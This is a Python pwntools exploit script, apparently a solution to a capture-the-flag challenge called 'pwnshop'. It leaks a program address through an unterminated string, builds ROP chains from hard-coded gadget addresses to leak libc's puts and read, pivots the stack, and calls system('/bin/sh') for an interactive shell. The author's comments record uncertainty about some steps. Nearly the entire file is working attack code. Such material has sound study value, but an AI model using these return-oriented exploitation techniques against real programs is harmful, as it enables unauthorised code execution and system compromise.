from pwn import *
import binascii
import time

context.binary = 'pwnshop'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

HOST = 

# Give it the base, the address from the base, then the leaked value
class OffsetCalculator():
  def __init__(self, base, addr, exec_addr):
    offset = addr - base
    self.base = base
    self.exec_base = exec_addr - offset

  # Takes in an address and remaps it to the executing base
  def get(self, addr):
    offset = addr - self.base
    return self.exec_base + offset

  def get_base(self):
    return self.exec_base
    

def get_process():
  proc = process()
  #proc = remote()

  return proc

def attach_gdb(proc):
  gdb.attach(proc, gdbscript="""

  """)
  time.sleep(5)

# Requires a stack pivot through overwriting ebp
# Since the data address is on the offset of 0x0c0, there is a 1/16th chance that it will be 0x00c0, which will stop the printf, so there is a 1/16th chance that this will not properly leak the string

# After using rop to leak libcs, we go back to the main to reset, then we rop to system()

# - sub esp, 0x28 which lets you to a small pivot in the buffer you control as well

# Would it be easier to store the bellow in a dictionary? this way you could sanitize them??? unsure maybe not, just keep forgetting to map them
# Lets us discover this https://libc.blukat.me/?q=puts%3A7f2683280e50%2C__read%3A7f26833147d0&l=libc6_2.35-0ubuntu3.6_amd64 library

g_pop_rdi = 0x5555555553c3
g_sub_esp_0x28 = 0x55555555521a # there is a reason why this gadget doesnt work, when you subtract esp, im guessing it 0s out the rest of the data when subtracting to deal with signedness
g_sub_rsp_0x28 = 0x555555555219
g_ret = 0x55555555501a

got_puts = 0x555555558018
got_read = 0x555555558030
plt_puts = 0x555555555030
stack_pivot = 0x5555555580c0

f_overflow = 0x55555555532a
f_main = 0x5555555550a0

def main():
  proc = get_process()
  attach_gdb(proc)

  payload = b''.join([

  ])

  # Leak value, write, the stack pivot

  proc.sendlineafter(b'Exit\n> ', b'2')
  proc.sendlineafter(b'What do you wish to sell? ', b'nothing')
  proc.sendlineafter(b'How much do you want for it? ', b'A' * 8)
  proc.recvuntil(b'A'*8)
  data_address = proc.recvline().strip().split(b'?')[0][::-1]

  if len(data_address) != 6:
    print("Stumbled on bad offset")
    return
  
  addressMapper = OffsetCalculator(0x555555554000, 0x5555555580c0, int.from_bytes(data_address, "big"))
  #print(hex(addressMapper.get(0x555555558020)))
  map_g_pop_rdi = addressMapper.get(g_pop_rdi)
  map_got_puts = addressMapper.get(got_puts)
  map_got_read = addressMapper.get(got_read)
  map_plt_puts = addressMapper.get(plt_puts)
  
  payload = b''.join([
    p64(map_g_pop_rdi),
    p64(map_got_puts),
    p64(map_plt_puts),
    p64(map_g_pop_rdi),
    p64(map_got_read),
    p64(map_plt_puts),
  ])
  proc.sendlineafter(b'Exit\n> ', b'22') # unsure what is happening here, it just throws away the first 2??
  proc.sendlineafter(b'What do you wish to sell? ', b'nothing')
  proc.sendlineafter(b'How much do you want for it? ', b'13.37')
  proc.sendline(b'/bin/sh')

  proc.sendlineafter(b'Exit\n> ', b'1') # unsure what is happening here, it just throws away the first 2??

  map_stack_pivot = addressMapper.get(stack_pivot)

  
  #map_g_sub_esp_0x28 = addressMapper.get(g_sub_esp_0x28) 
  map_g_sub_rsp_0x28 = addressMapper.get(g_sub_rsp_0x28)
  map_f_overflow = addressMapper.get(f_overflow)
  map_g_ret = addressMapper.get(g_ret)
  map_f_main = addressMapper.get(f_main)
  # Instead of being specific, we can just ret sled this
  payload = b''.join([
    p64(map_g_ret) * 5,
    p64(map_g_pop_rdi), #0x8
    p64(map_got_puts), #0x10
    p64(map_plt_puts), #0x18 
    p64(map_f_main),#0x20
    p64(map_g_sub_rsp_0x28) #0x28
  ])
  proc.sendlineafter(b'Enter details: ', payload) # unsure what is happening here, it just throws away the first 2??
  libc_leak = int.from_bytes(proc.recvline().strip(), "little")
  print(hex(libc_leak))

  libcMapper = OffsetCalculator(0,0x080e50,libc_leak) # Map based off of leaked puts

  libc_system = 0x050d70
  map_libc_system = libcMapper.get(libc_system)
  print(hex(map_libc_system))

  payload = b''.join([
    p64(map_g_ret) * 5,
    p64(map_g_pop_rdi), #0x8
    p64(map_stack_pivot), #0x10
    p64(map_g_ret),#0x18
    p64(map_libc_system), #0x20
    p64(map_g_sub_rsp_0x28) #0x28
  ])
  proc.sendlineafter(b'Exit\n> ', b'11') # unsure what is happening here, it just throws away the first 2??
  proc.sendlineafter(b'Enter details: ', payload) # unsure what is happening here, it just throws away the first 2??
  proc.interactive()
  print(hex(int.from_bytes(proc.recvline().strip(), "little")))

  #print(proc.recvline())



if __name__ == '__main__':
  main()
